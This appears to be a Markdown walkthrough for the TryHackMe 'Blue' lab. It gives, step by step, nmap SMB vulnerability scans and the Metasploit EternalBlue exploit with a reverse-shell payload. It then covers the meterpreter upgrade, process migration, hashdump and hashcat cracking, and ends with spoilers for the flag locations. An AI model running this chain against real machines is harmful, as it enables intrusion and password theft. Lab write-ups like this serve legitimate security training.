# Walkthrough For Lab Blue On TryHackMe

1. Scan the target using nmap :
```
nmap -sV -T5 <target ip>
```
2. Use nmap smb scripts  to find out which exploit it's vulnerable to (try all the ms* one by one):
list the scripts related to smb-vuln-ms with this command:
```
ls /usr/share/nmap/scripts | grep smb-vuln-ms
```
try them like this one by one
```
nmap -p 445 --script smb-vuln-ms06-025
```
after finding out search for exploit in metasploit
start metasploit
```
msfconsole
```
```
search ms17_010
```
```
use exploit/windows/smb/ms17_010_eternalblue
```
after selecting set the rhosts 
```
set rhosts <target ip>
```
set the payload for reverse shell
```
set payload windows/x64/shell/reverse_tcp
```
run the exploit with : `run` or `exploit`

after gaining the shell use : `whoami`\
the output will be : *NT AUTHORITY\SYSTEM*

background the session using : `ctrl + z` and confirm with `y`

time to upgrade the shell to meterpreter so, search in msfconsole 
```
search shell_to_meterpreter
```
then select
```
use post/multi/manage/shell_to_meterpreter
```
set the session using (list sessions using `sessions -i` note the number shown in the first column) :
```
set session <session number>
```
run the exploit and wait : `run` or `exploit`\
after successful exploitation list out sessions and connect to the meterpreter
```
sessions -i 
```
connect to the new session named meterpreter with
```
sessions -i <session number>
```
use the ps command to list out processes : `ps`\
then note the last process that have the value : *NT AUTHORITY\SYSTEM*
then migrate the process with this to gain privilege
```
migrate <process id>
```
now time to dump the hashes use
```
hashdump
```
note the hashes and identify the user\
other than admin or default and crack the hash with hashcat\
I stored the hash in hash.txt and using rockyou.txt as wordlist
```
hashcat -a 0 -m 1000 hash.txt /path/rockyou.txt
```
*Got the Password*\
Now Time to find the flags:
<details>
  <summary>spoiler alert</summary>
  <p>1. cd C:/ & cat flag1.txt </p>
  <p>2. cd C:/Windows/System32/Config & cat flag2.txt</p>
  <p>3. cd C:/Users/Jon/Documents/flag3.txt</p>
</details>




